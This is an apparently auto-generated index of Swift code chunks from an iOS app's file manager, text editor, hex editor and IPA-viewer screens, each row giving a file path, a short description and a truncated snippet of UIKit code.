container.backgroundColor = type.backgroundColor
container.alpha = 0
container.layer.cornerRadius = 10
container.translatesAutoresizingMaskIntoConstraints = false
view.addSubview(container)

// Create message label"
2462,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift","/ Alternative implementation of importFile","@objc func enhancedImportFileMethod() {
enhancedImportFile()
}
}

// Using the LED effect from UIView+LED extension instead
extension HomeViewController {"
2463,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift","Using the LED effect from UIView+LED extension instead","extension HomeViewController {
func showUploadStatusIndicator(type: UploadStatus) {"
2464,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift","Function showUploadStatusIndicator - implements showuploadstatusindicator functionality","func showUploadStatusIndicator(type: UploadStatus) {
let color: UIColor
switch type {"
2465,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController+FileUploadFix.swift","enum UploadStatus - implements functionality related to upload status","enum UploadStatus {
case success
case error
case warning
case info

var glowColor: UIColor {"
2466,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","MARK: - HomeViewController - Core Component This file is the main view controller for file operations","class HomeViewController: UIViewController, UISearchResultsUpdating, UIDocumentPickerDelegate, FileHandlingDelegate,
UITableViewDelegate, UITableViewDataSource, UITableViewDragDelegate, UITableViewDropDelegate
{"
2467,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","enum SortOrder - implements functionality related to sort order","enum SortOrder: String {
case name, date, size
}

var activityIndicator: UIActivityIndicatorView {"
2468,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()
setupUI()
setupActivityIndicator()
loadFiles()
configureTableView()
}

deinit {"
2469,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","MARK: - UI Setup","private func setupUI() {
view.backgroundColor = UIColor.systemBackground.withAlphaComponent(0.9)
view.layer.applyFuturisticShadow()

let navItem = UINavigationItem(title: ""File Nexus"")
let menuButton = UIBarButtonItem(
image: UIImage(systemName: ""ellipsis.circle.fill""),
style: .plain,
target: self,
action: #selector(showMenu)"
2470,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","/ Applies a futuristic transition effect to the view","@objc func applyFuturisticEffect() {
// Create a snapshot of the current view
guard let snapshot = view.snapshotView(afterScreenUpdates: false) else { return }"
2471,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","Function setupActivityIndicator - sets upactivityindicator","private func setupActivityIndicator() {
view.addSubview(activityIndicator)
NSLayoutConstraint.activate([
activityIndicator.centerXAnchor.constraint(equalTo: view.centerXAnchor),
activityIndicator.centerYAnchor.constraint(equalTo: view.centerYAnchor),
])
}

private func configureTableView() {"
2472,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","Function configureTableView - implements configuretableview functionality","private func configureTableView() {
HomeViewUI.fileListTableView.delegate = self
HomeViewUI.fileListTableView.dataSource = self
HomeViewUI.fileListTableView.dragDelegate = self
HomeViewUI.fileListTableView.dropDelegate = self
HomeViewUI.fileListTableView.register(FileTableViewCell.self, forCellReuseIdentifier: ""FileCell"")
HomeViewUI.fileListTableView.backgroundColor = .clear
HomeViewUI.fileListTableView.layer.cornerRadius = 15
HomeViewUI.fileListTableView.layer.applyFuturisticShadow()
}"
2473,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","Function createFilesDirectoryIfNeeded - creates filesdirectoryifneeded","private func createFilesDirectoryIfNeeded(at directory: URL) -> Bool {
// Check if directory already exists
if fileManager.fileExists(atPath: directory.path) {"
2474,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","Function saveState - implements savestate functionality","private func saveState() {
UserDefaults.standard.set(sortOrder.rawValue, forKey: ""sortOrder"")
}

// MARK: - File Operations

/// Loads files from the documents directory and updates the UI
func loadFiles() {"
2475,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","MARK: - File Operations / Loads files from the documents directory and updates the UI","func loadFiles() {
// Start loading indicator
activityIndicator.startAnimating()

// Ensure the documents directory exists before trying to load files
if !createFilesDirectoryIfNeeded(at: documentsDirectory) {"
2476,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","/ Shows a message when the file list is empty / - Parameter error: Optional error to show","private func showEmptyStateMessage(withError error: Error? = nil) {
// Check if we already have an empty state label
if let existingLabel = view.viewWithTag(1001) as? UILabel {"
2477,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","/ Hides the empty state message","private func hideEmptyStateMessage() {
if let emptyLabel = view.viewWithTag(1001) {"
2478,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","/ Creates a new directory","@objc func addDirectory() {
let alertController = UIAlertController(
title: ""Add Directory"",
message: ""Enter the name of the new directory"",
preferredStyle: .alert
)
alertController.addTextField { textField in"
2479,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","/ Initiates the file import process","@objc func importFile() {
fileHandlers.importFile(viewController: self)
}

@objc func performFileImport() {"
2480,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","Function performFileImport - implements performfileimport functionality","@objc func performFileImport() {
fileHandlers.importFile(viewController: self)
}

/// Handles a file that has been imported from outside the app
/// - Parameter url: The URL of the imported file
func handleImportedFile(url: URL) {"
2481,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","/ Handles a file that has been imported from outside the app / - Parameter url: The URL of the imported file","func handleImportedFile(url: URL) {
// Show loading indicator
activityIndicator.startAnimating()

// Generate a unique name if a file with the same name exists
let fileName = Self.getUniqueFileNameShared(for: url.lastPathComponent)
let destinationURL = documentsDirectory.appendingPathComponent(fileName)

Debug.shared.log(message: ""Importing file from \(url.path) to \(destinationURL.path)"", type: .info)
"
2482,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","/ Generates a unique filename if the original already exists / - Parameter filename: The original filename / - Returns: A unique filename Static version of getUniqueFileName - fully implemented to avoid instance member access","static func getUniqueFileNameShared(for filename: String) -> String {
// Get the documents directory in a static-friendly way
let fileManager = FileManager.default
guard let documentsDir = fileManager.urls(for: .documentDirectory, in: .userDomainMask).first?
.appendingPathComponent(""files"")
else {"
2483,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","/ Deletes a file at the specified index / - Parameter index: The index of the file to delete","func deleteFile(at index: Int) {
// Get the file based on whether we're in search mode or not
let file = searchController.isActive ? filteredFileList[index] : fileList[index]
// File URL will be accessed via file.url when needed

// Confirm deletion to prevent accidental data loss
let fileType = file.isDirectory ? ""folder"" : ""file""
let message = ""Are you sure you want to delete this \(fileType)?\n\nName: \(file.name)\n\(file.formattedSize())""

let alert = UIAlertController("
2484,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","/ Performs the actual deletion operation after confirmation / - Parameters: /   - file: The file to delete /   - index: The index of the file","private func performFileDeletion(file: File, at index: Int) {
activityIndicator.startAnimating()

Debug.shared.log(message: ""Deleting file: \(file.url.path)"", type: .info)

DispatchQueue.global(qos: .userInitiated).async { [weak self] in"
2485,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","/ Updates the UI after a file has been deleted / - Parameters: /   - file: The file that was deleted /   - index: The index of the file","private func updateUIAfterDeletion(file: File, index: Int) {
// Update the appropriate file list
if searchController.isActive {"
2486,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","Function sortFiles - implements sortfiles functionality","func sortFiles() {
switch sortOrder {"
2487,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","MARK: - UI Actions","@objc func showMenu() {
let alertController = UIAlertController(title: ""Sort By"", message: nil, preferredStyle: .actionSheet)

let sortByNameAction = UIAlertAction(title: ""Name"", style: .default) { [weak self] _ in"
2488,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","Function updateSearchResults - updates searchresults","func updateSearchResults(for searchController: UISearchController) {
guard let searchText = searchController.searchBar.text?.lowercased() else { return }"
2489,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","addDirectory is now implemented above with proper memory management using [weak self]","func showFileOptions(for file: File) {
let alertController = UIAlertController(title: ""File Options"", message: file.name, preferredStyle: .actionSheet)

// Different options based on whether it's a directory or file
if file.isDirectory {"
2490,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","Function createNewFile - creates newfile","private func createNewFile(in directory: File? = nil) {
let alertController = UIAlertController(
title: ""Create New File"",
message: ""Enter a name for the new file"",
preferredStyle: .alert
)

alertController.addTextField { textField in"
2491,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","Function createNewFolder - creates newfolder","private func createNewFolder(in directory: File? = nil) {
let alertController = UIAlertController(
title: ""Create New Folder"",
message: ""Enter a name for the new folder"",
preferredStyle: .alert
)

alertController.addTextField { textField in"
2492,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","Function renameFile - implements renamefile functionality","func renameFile(_ file: File) {
let alertController = UIAlertController(
title: ""Rename \(file.isDirectory ? ""Folder"" : ""File"")"",
message: ""Enter a new name"",
preferredStyle: .alert
)

alertController.addTextField { textField in"
2493,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","Function openFile - implements openfile functionality","func openFile(_ file: File) {
// Show loading indicator while preparing
activityIndicator.startAnimating()

// First check if file exists
guard fileManager.fileExists(atPath: file.url.path) else {"
2494,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","Function openDirectory - implements opendirectory functionality","private func openDirectory(_ directory: File) {
Debug.shared.log(message: ""Opening directory: \(directory.url.path)"", type: .info)

DispatchQueue.global(qos: .userInitiated).async { [weak self] in"
2495,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","Function presentArchiveOptions - implements presentarchiveoptions functionality","private func presentArchiveOptions(for file: File) {
let alert = UIAlertController(
title: ""Archive Options"",
message: ""What would you like to do with \(file.name)?"",
preferredStyle: .actionSheet
)

let extractAction = UIAlertAction(title: ""Extract"", style: .default) { [weak self] _ in"
2496,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","Function _presentImagePreview - implements  presentimagepreview functionality","private func _presentImagePreview(for file: File) {
// For this implementation, we'll just show a simple alert that this feature is coming soon
// In a full implementation, we would display the image in a proper image viewer
let alert = UIAlertController(
title: ""Image Preview"",
message: ""Image preview functionality will be available in a future update. Would you like to view this file as hex data?"",
preferredStyle: .alert
)

let viewHexAction = UIAlertAction(title: ""View as Hex"", style: .default) { [weak self] _ in"
2497,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","Function extractArchive - implements extractarchive functionality","func extractArchive(_ file: File) {
// Show activity indicator
activityIndicator.startAnimating()

// Get destination directory name (remove extension from file name)
let baseName = file.name.components(separatedBy: ""."").dropLast().joined(separator: ""."")
let destinationName = baseName.isEmpty ? ""Extracted_\(Int(Date().timeIntervalSince1970))"" : baseName
let destinationURL = documentsDirectory.appendingPathComponent(destinationName)

DispatchQueue.global(qos: .userInitiated).async { [weak self] in"
2498,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","MARK: - UITableViewDataSource","func tableView(_: UITableView, numberOfRowsInSection _: Int) -> Int {
return searchController.isActive ? filteredFileList.count : fileList.count
}

func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {"
2499,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
guard let cell = tableView
.dequeueReusableCell(withIdentifier: ""FileCell"", for: indexPath) as? FileTableViewCell
else {"
2500,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","MARK: - UITableViewDelegate","func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
let file = searchController.isActive ? filteredFileList[indexPath.row] : fileList[indexPath.row]
// Instead of showing options, directly open the file for a more intuitive experience
openFile(file)
tableView.deselectRow(at: indexPath, animated: true)
}

func tableView(_: UITableView,
trailingSwipeActionsConfigurationForRowAt indexPath: IndexPath) -> UISwipeActionsConfiguration?
{"
2501,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView,
trailingSwipeActionsConfigurationForRowAt indexPath: IndexPath) -> UISwipeActionsConfiguration?
{"
2502,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","MARK: - UIDocumentPickerDelegate Implementation for UIDocumentPickerDelegate","func documentPicker(_: UIDocumentPickerViewController, didPickDocumentsAt urls: [URL]) {
// Handle potentially multiple selected files
guard !urls.isEmpty else {"
2503,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","Function documentPickerWasCancelled - implements documentpickerwascancelled functionality","func documentPickerWasCancelled(_: UIDocumentPickerViewController) {
Debug.shared.log(message: ""Document picker was cancelled"", type: .info)
// Stop any loading indicators that might be active
activityIndicator.stopAnimating()
}

// MARK: - Private Methods

private func applyFuturisticTransition() {"
2504,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","MARK: - Private Methods","private func applyFuturisticTransition() {
let transition = CATransition()
transition.duration = 0.5
transition.type = .push
transition.subtype = .fromTop
transition.timingFunction = CAMediaTimingFunction(name: .easeOut)
view.layer.add(transition, forKey: nil)
}
}
"
2505,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Core/HomeViewController.swift","extension CALayer - implements functionality related to c a layer","extension CALayer {
// This method is now defined in HomeViewExtras.swift
// to avoid duplicate definitions
}
"
2506,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","class BaseEditorViewController - Controls user interface and application flow","class BaseEditorViewController: UIViewController, UITextViewDelegate {
/// The URL of the file being edited
let fileURL: URL

/// The main text view for editing content
let textView: UITextView

/// The toolbar with editing actions
let toolbar: UIToolbar
"
2507,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()
setupUI()
loadFileContent()
startAutoSaveTimer()
}

override func viewWillDisappear(_ animated: Bool) {"
2508,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","Function viewWillDisappear - implements viewwilldisappear functionality","override func viewWillDisappear(_ animated: Bool) {
super.viewWillDisappear(animated)
stopAutoSaveTimer()
if hasUnsavedChanges {"
2509,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","MARK: - Setup / Sets up the user interface","func setupUI() {
view.backgroundColor = UIColor.systemBackground.withAlphaComponent(0.95)
view.layer.applyFuturisticShadow()

setupTextView()
setupToolbar()
setupConstraints()
setupAccessibility()
}
"
2510,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","/ Sets up the text view","private func setupTextView() {
textView.translatesAutoresizingMaskIntoConstraints = false
textView.font = .monospacedSystemFont(ofSize: 14, weight: .regular)
textView.delegate = self
textView.layer.cornerRadius = 10
textView.layer.borderColor = UIColor.systemCyan.withAlphaComponent(0.2).cgColor
textView.layer.borderWidth = 1
view.addSubview(textView)
}
"
2511,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","/ Sets up the toolbar and its items","private func setupToolbar() {
toolbar.translatesAutoresizingMaskIntoConstraints = false

let saveButton = UIBarButtonItem(barButtonSystemItem: .save, target: self, action: #selector(saveChanges))
let copyButton = UIBarButtonItem(barButtonSystemItem: .action, target: self, action: #selector(copyContent))
let findReplaceButton = UIBarButtonItem(
title: ""Find/Replace"",
style: .plain,
target: self,
action: #selector(promptFindReplace)"
2512,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","/ Sets up layout constraints","private func setupConstraints() {
NSLayoutConstraint.activate([
textView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor, constant: 10),
textView.leadingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leadingAnchor, constant: 10),
textView.trailingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.trailingAnchor, constant: -10),
textView.bottomAnchor.constraint(equalTo: toolbar.topAnchor, constant: -10),

toolbar.leadingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leadingAnchor, constant: 10),
toolbar.trailingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.trailingAnchor, constant: -10),
toolbar.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -10),"
2513,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","/ Sets up accessibility labels","private func setupAccessibility() {
textView.isAccessibilityElement = true
textView.accessibilityLabel = ""File Editor""

toolbar.isAccessibilityElement = true
toolbar.accessibilityLabel = ""Editor Toolbar""
}

// MARK: - File Operations
"
2514,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","MARK: - File Operations / Loads file content into the text view / Subclasses should override this method to provide specific loading behavior","func loadFileContent() {
// Check file size before loading
do {"
2515,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","/ Loads a text file into the text view","private func loadTextFile() {
let activityIndicator = UIActivityIndicatorView(style: .large)
activityIndicator.center = view.center
activityIndicator.startAnimating()
view.addSubview(activityIndicator)

DispatchQueue.global(qos: .userInitiated).async { [weak self] in"
2516,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","/ Saves changes to the file / Subclasses should override this method to provide specific saving behavior","@objc func saveChanges() {
guard let text = textView.text else { return }"
2517,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","MARK: - Editor Actions / Copies the content to the clipboard","@objc func copyContent() {
UIPasteboard.general.string = textView.text
HapticFeedbackGenerator.generateNotificationFeedback(type: .success)
presentAlert(title: ""Copied"", message: ""Content copied to clipboard."")
}

/// Prompts for find and replace
@objc func promptFindReplace() {"
2518,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","/ Prompts for find and replace","@objc func promptFindReplace() {
let alert = UIAlertController(title: ""Find and Replace"", message: nil, preferredStyle: .alert)

alert.addTextField { textField in"
2519,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","/ Performs find and replace operation / - Parameters: /   - findText: Text to find /   - replaceText: Text to replace with","func findAndReplace(findText: String, replaceText: String) {
guard !findText.isEmpty, let text = textView.text else { return }"
2520,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","/ Performs undo operation","@objc func undoAction() {
textView.undoManager?.undo()
}

/// Performs redo operation
@objc func redoAction() {"
2521,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","/ Performs redo operation","@objc func redoAction() {
textView.undoManager?.redo()
}

// MARK: - Timer Management

/// Starts the auto-save timer
func startAutoSaveTimer() {"
2522,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","MARK: - Timer Management / Starts the auto-save timer","func startAutoSaveTimer() {
autoSaveTimer = Timer.scheduledTimer(
timeInterval: 60.0,
target: self,
selector: #selector(autoSave),
userInfo: nil,
repeats: true
)
}
"
2523,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","/ Stops the auto-save timer","func stopAutoSaveTimer() {
autoSaveTimer?.invalidate()
autoSaveTimer = nil
}

/// Auto-saves changes
@objc func autoSave() {"
2524,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","/ Auto-saves changes","@objc func autoSave() {
if hasUnsavedChanges {"
2525,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","MARK: - Alerts / Prompts to save changes","func promptSaveChanges() {
let alert = UIAlertController(
title: ""Unsaved Changes"",
message: ""Save changes before leaving?"",
preferredStyle: .alert
)

let saveAction = UIAlertAction(title: ""Save"", style: .default) { [weak self] _ in"
2526,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","/ Presents an alert with a title and message / - Parameters: /   - title: Alert title /   - message: Alert message","func presentAlert(title: String, message: String) {
let alert = UIAlertController(
title: title,
message: message,
preferredStyle: .alert
)

let okAction = UIAlertAction(title: ""OK"", style: .default)
alert.addAction(okAction)
"
2527,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/BaseEditorViewController.swift","MARK: - UITextViewDelegate","func textViewDidChange(_: UITextView) {
hasUnsavedChanges = true
}
}
"
2528,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/HexEditorViewController.swift","/ Editor for binary files in hexadecimal format","class HexEditorViewController: BaseEditorViewController {
/// Maximum size in bytes for display in the editor (1MB)
private let maxDisplaySize: UInt64 = 1_000_000

override func viewDidLoad() {"
2529,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/HexEditorViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()

// Set specific accessibility label for hex editor
textView.accessibilityLabel = ""Hex Editor""

// Configure text view for hex editing
textView.autocorrectionType = .no
textView.autocapitalizationType = .none
textView.smartDashesType = .no"
2530,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/HexEditorViewController.swift","Function loadFileContent - implements loadfilecontent functionality","override func loadFileContent() {
// Check file size before loading to avoid performance issues with large files
do {"
2531,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/HexEditorViewController.swift","Function saveChanges - implements savechanges functionality","override func saveChanges() {
guard let text = textView.text else { return }"
2532,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/HexEditorViewController.swift","/ Loads binary content as hex string / - Parameter maxSize: Maximum number of bytes to load","private func loadHexContent(maxSize: UInt64) {
let activityIndicator = UIActivityIndicatorView(style: .large)
activityIndicator.center = view.center
activityIndicator.startAnimating()
view.addSubview(activityIndicator)

DispatchQueue.global(qos: .userInitiated).async { [weak self] in"
2533,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/HexEditorViewController.swift","/ Toggle between hex and ASCII view modes","@objc private func toggleViewMode() {
guard let hexText = textView.text else { return }"
2534,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/HexEditorViewController.swift","/ Display file information","@objc private func showFileInfo() {
do {"
2535,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/HexEditorViewController.swift","Override find and replace to handle hex values correctly","override func findAndReplace(findText: String, replaceText: String) {
guard !findText.isEmpty, let text = textView.text else { return }"
2536,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","class IPAEditorViewController - Controls user interface and application flow","class IPAEditorViewController: UIViewController, UITableViewDelegate, UITableViewDataSource {
// MARK: - Properties

/// The URL of the IPA file being examined
private let fileURL: URL

/// Table view for displaying extracted contents
private let tableView: UITableView

/// Toolbar for actions"
2537,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()
setupUI()
extractIPAContents()
}

override func viewWillDisappear(_ animated: Bool) {"
2538,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","Function viewWillDisappear - implements viewwilldisappear functionality","override func viewWillDisappear(_ animated: Bool) {
super.viewWillDisappear(animated)
cleanupTempDirectory()
}

deinit {"
2539,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","MARK: - UI Setup / Sets up the user interface","private func setupUI() {
view.backgroundColor = UIColor.systemBackground.withAlphaComponent(0.95)
view.layer.applyFuturisticShadow()

setupTableView()
setupToolbar()
setupActivityIndicator()
setupConstraints()
}
"
2540,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","/ Sets up the table view","private func setupTableView() {
tableView.translatesAutoresizingMaskIntoConstraints = false
tableView.delegate = self
tableView.dataSource = self
tableView.register(UITableViewCell.self, forCellReuseIdentifier: ""Cell"")
tableView.layer.cornerRadius = 10
tableView.layer.borderColor = UIColor.systemCyan.withAlphaComponent(0.2).cgColor
tableView.layer.borderWidth = 1
view.addSubview(tableView)
"
2541,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","/ Sets up the toolbar","private func setupToolbar() {
toolbar.translatesAutoresizingMaskIntoConstraints = false

let backButton = UIBarButtonItem(
image: UIImage(systemName: ""chevron.backward""),
style: .plain,
target: self,
action: #selector(navigateBack)
)
backButton.isEnabled = false"
2542,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","/ Sets up the activity indicator","private func setupActivityIndicator() {
activityIndicator.translatesAutoresizingMaskIntoConstraints = false
activityIndicator.hidesWhenStopped = true
activityIndicator.color = .systemCyan
view.addSubview(activityIndicator)
}

/// Sets up layout constraints
private func setupConstraints() {"
2543,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","/ Sets up layout constraints","private func setupConstraints() {
NSLayoutConstraint.activate([
tableView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor, constant: 10),
tableView.leadingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leadingAnchor, constant: 10),
tableView.trailingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.trailingAnchor, constant: -10),
tableView.bottomAnchor.constraint(equalTo: toolbar.topAnchor, constant: -10),

toolbar.leadingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.leadingAnchor, constant: 10),
toolbar.trailingAnchor.constraint(equalTo: view.safeAreaLayoutGuide.trailingAnchor, constant: -10),
toolbar.bottomAnchor.constraint(equalTo: view.safeAreaLayoutGuide.bottomAnchor, constant: -10),"
2544,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","MARK: - IPA Processing / Extract the contents of the IPA file","private func extractIPAContents() {
activityIndicator.startAnimating()

// Create a unique temporary directory
let newTempDirectory = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
tempDirectory = newTempDirectory

DispatchQueue.global(qos: .userInitiated).async { [weak self] in"
2545,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Home/Editors/IPAEditorViewController.swift","/ Navigate into a subdirectory / - Parameter directoryURL: The URL of the directory to navigate into","private func navigateToDirectory(_ directoryURL: URL) {
activityIndicator.startAnimating()

// Save current directory to stack
if let currentDir = currentDirectory {"
